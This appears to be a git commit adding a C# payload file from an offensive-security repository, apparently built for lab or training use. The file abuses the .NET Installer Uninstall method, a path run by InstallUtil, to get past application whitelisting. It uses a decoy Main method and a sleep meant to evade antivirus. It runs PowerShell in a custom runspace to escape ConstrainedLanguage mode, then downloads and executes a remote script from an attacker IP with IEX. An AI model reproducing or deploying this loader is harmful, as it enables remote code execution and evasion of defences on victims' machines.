ce1a297c08d6734245d77c0fef71a1d42c4a606e
al1z4deh <90620429+al1z4deh@users.noreply.github.com>
2024-08-14 15:27:28 +0400

    Create clmpow.cs

---
+++ Injection/Payloads/clmpow.cs
@@ -0,0 +1,49 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+using System.Threading;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            // Sleep for a short duration to evade antivirus
+            Thread.Sleep(5000); // Sleep for 5 seconds
+
+            // Bypass PowerShell ConstrainedLanguage mode
+            string cmdBypass = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            RunPowerShellCommand(cmdBypass);
+
+            // Execute the PowerShell script from the URL after the bypass
+            string cmdExecute = "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.162/run.txt')";
+            RunPowerShellCommand(cmdExecute);
+        }
+
+        private void RunPowerShellCommand(string command)
+        {
+            using (Runspace rs = RunspaceFactory.CreateRunspace())
+            {
+                rs.Open();
+                using (PowerShell ps = PowerShell.Create())
+                {
+                    ps.Runspace = rs;
+                    ps.AddScript(command);
+                    ps.Invoke();
+                }
+                rs.Close();
+            }
+        }
+    }
+}
